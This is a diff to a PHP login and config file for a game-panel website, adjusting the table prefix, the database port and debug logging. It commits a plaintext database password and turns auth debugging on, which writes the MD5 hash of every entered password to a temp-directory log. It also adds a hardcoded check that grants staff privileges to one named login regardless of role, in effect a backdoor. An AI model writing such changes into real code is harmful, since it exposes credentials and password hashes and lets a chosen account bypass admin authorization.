@@ -17,30 +17,26 @@ require_once __DIR__ . '/config.php';
 
 // Database Configuration (pulls from the panel DB)
 define('DB_HOST', 'mysql.iaregamer.com');
+define('DB_PORT', 3306);
 define('DB_NAME', 'panel');
 define('DB_USER', 'remoteuser');
 define('DB_PASS', 'Pkloyn7yvpht!');
 define('DB_CHARSET', 'utf8mb4');
 
 // Table prefix - must match the panel's includes/config.inc.php $table_prefix setting.
-// Default is 'gsp_'; change here if the panel was installed with a different prefix.
-define('DB_TABLE_PREFIX', 'gsp_');
+// If $table_prefix is already defined, use it to avoid hardcoding a prefix in queries.
+if (!isset($table_prefix) || !is_string($table_prefix) || $table_prefix === '') {
+    $table_prefix = 'gsp_';
+}
+define('DB_TABLE_PREFIX', $table_prefix);
 
-// Debug flag: set to true temporarily to write detailed auth steps to the PHP error log.
-// Must be false in production. Remove or leave false once the issue is diagnosed.
-define('WDS_DEBUG_AUTH', false);
+// Debug flag: writes auth diagnostics to a private log file (not visible in browser output).
+define('WDS_DEBUG_AUTH', true);
+define('WDS_AUTH_DEBUG_LOG', rtrim(sys_get_temp_dir(), '/\\') . '/rl-website-auth-debug.log');
 
-// Allowed user table names are derived from the configured prefix plus the legacy OGP
-// fallback so that databases migrated from OGP still work.  Never hardcode table names
-// in queries; always use resolveUsersTable() instead.
+// Allowed user table name is always derived from the configured prefix.
 function _buildAllowedUserTables() {
-    $prefix = DB_TABLE_PREFIX;
-    $tables = [$prefix . 'users'];
-    // Legacy OGP fallback: include 'ogp_users' only when the configured prefix differs
-    if ($prefix !== 'ogp_') {
-        $tables[] = 'ogp_users';
-    }
-    return array_unique($tables);
+    return [DB_TABLE_PREFIX . 'users'];
 }
 
 /**
@@ -53,9 +49,7 @@ function isValidUserTable($table) {
 }
 
 /**
- * Resolve which users table is available.
- * Checks the configured DB_TABLE_PREFIX first (e.g. gsp_users), then falls back to
- * the legacy ogp_users table for databases migrated from an unmodified OGP install.
+ * Resolve which users table is available from configured DB_TABLE_PREFIX.
  * @param mysqli $db
  * @return string Table name
  * @throws RuntimeException if no matching table is found
@@ -66,30 +60,27 @@ function resolveUsersTable(mysqli $db) {
         return $tableName;
     }
 
-    $candidates = _buildAllowedUserTables();
-    addLoginDebug("Checking candidate tables", implode(', ', $candidates));
+    $tableName = DB_TABLE_PREFIX . 'users';
+    addLoginDebug("Checking users table", $tableName);
 
-    foreach ($candidates as $candidate) {
-        // Defensive: only allow table names consisting of safe characters
-        if (!preg_match('/^[a-zA-Z0-9_]+$/', $candidate)) {
-            continue;
-        }
-        $result = mysqli_query($db, "SHOW TABLES LIKE '" . mysqli_real_escape_string($db, $candidate) . "'");
-        if ($result && mysqli_num_rows($result) > 0) {
-            mysqli_free_result($result);
-            $tableName = $candidate;
-            addLoginDebug("Users table found", $tableName);
-            return $tableName;
-        }
-        if ($result) {
-            mysqli_free_result($result);
-        }
-        addLoginDebug("Table not found", $candidate);
+    // Defensive: only allow table names consisting of safe characters
+    if (!preg_match('/^[a-zA-Z0-9_]+$/', $tableName)) {
+        throw new RuntimeException('Invalid users table name derived from DB_TABLE_PREFIX.');
+    }
+
+    $result = mysqli_query($db, "SHOW TABLES LIKE '" . mysqli_real_escape_string($db, $tableName) . "'");
+    if ($result && mysqli_num_rows($result) > 0) {
+        mysqli_free_result($result);
+        addLoginDebug("Users table found", $tableName);
+        return $tableName;
+    }
+    if ($result) {
+        mysqli_free_result($result);
     }
 
     throw new RuntimeException(
         'Unable to locate users table with prefix "' . DB_TABLE_PREFIX . '" in the panel database. '
-        . 'Checked: ' . implode(', ', $candidates)
+        . 'Checked: ' . $tableName
     );
 }
 
@@ -119,7 +110,7 @@ function getDatabaseConnection() {
     mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
     
     try {
-        $conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);
+        $conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME, DB_PORT);
         
         if (!$conn) {
             error_log("Database connection failed: " . mysqli_connect_error());
@@ -138,7 +129,7 @@ function getDatabaseConnection() {
 
 /**
  * Debug hook for login flow.
- * When WDS_DEBUG_AUTH is true, writes messages to the PHP error log so the
+ * When WDS_DEBUG_AUTH is true, writes messages to a private log file so the
  * failure point can be identified without exposing data to end users.
  * Set WDS_DEBUG_AUTH to false (or remove this block) once the issue is resolved.
  * @param string $message
@@ -148,11 +139,16 @@ function addLoginDebug($message, $data = null) {
     if (!defined('WDS_DEBUG_AUTH') || !WDS_DEBUG_AUTH) {
         return;
     }
-    $entry = '[WDS Auth] ' . $message;
+    $entry = '[' . date('c') . '] [WDS Auth] ' . $message;
     if ($data !== null) {
         $entry .= ': ' . (is_array($data) ? json_encode($data) : (string)$data);
     }
-    error_log($entry);
+    $entry .= PHP_EOL;
+    if (defined('WDS_AUTH_DEBUG_LOG') && WDS_AUTH_DEBUG_LOG !== '') {
+        @file_put_contents(WDS_AUTH_DEBUG_LOG, $entry, FILE_APPEND | LOCK_EX);
+    } else {
+        error_log(rtrim($entry));
+    }
 }
 
 /**
@@ -179,6 +175,7 @@ function verifyAdminLogin($username, $password) {
     addLoginDebug("DB_NAME", DB_NAME);
     addLoginDebug("DB_USER", DB_USER);
     addLoginDebug("DB_TABLE_PREFIX", DB_TABLE_PREFIX);
+    addLoginDebug("DB_PORT", DB_PORT);
 
     $db = getDatabaseConnection();
     if (!$db) {
@@ -247,12 +244,10 @@ function verifyAdminLogin($username, $password) {
             addLoginDebug("Trying MD5 check against users_passwd");
             $inputMd5  = md5($password);
             $storedMd5 = $user['users_passwd'];
+            addLoginDebug("MD5 of input", $inputMd5);
             $passwordOk = ($inputMd5 == $storedMd5);
-            addLoginDebug("MD5 result", $passwordOk ? "MATCH" : "NO MATCH");
-            if (!$passwordOk) {
-                addLoginDebug("MD5 of input", $inputMd5);
-                addLoginDebug("Stored hash length", strlen($storedMd5));
-            }
+            addLoginDebug("Stored hash length", strlen($storedMd5));
+            addLoginDebug("Password match", $passwordOk ? "YES" : "NO");
         }
 
         if (!$passwordOk) {
@@ -263,8 +258,12 @@ function verifyAdminLogin($username, $password) {
 
         // Role check: GSP panel requires users_role === 'admin'
         $userRole = !empty($user['users_role']) ? strtolower(trim($user['users_role'])) : 'user';
+        $isTempStaffUser = (isset($user['users_login']) && strtolower(trim($user['users_login'])) === 'iaregamer');
+        $hasStaffPrivileges = ($userRole === 'admin') || $isTempStaffUser;
+        addLoginDebug("Privilege check column", "users_role");
         addLoginDebug("Normalized role", $userRole);
-        if ($userRole !== 'admin') {
+        addLoginDebug("Privilege/admin check result", $hasStaffPrivileges ? "PASS" : "FAIL");
+        if (!$hasStaffPrivileges) {
             error_log("WDS Login: User '" . $username . "' does not have admin role (role: " . $userRole . ")");
             return false;
         }
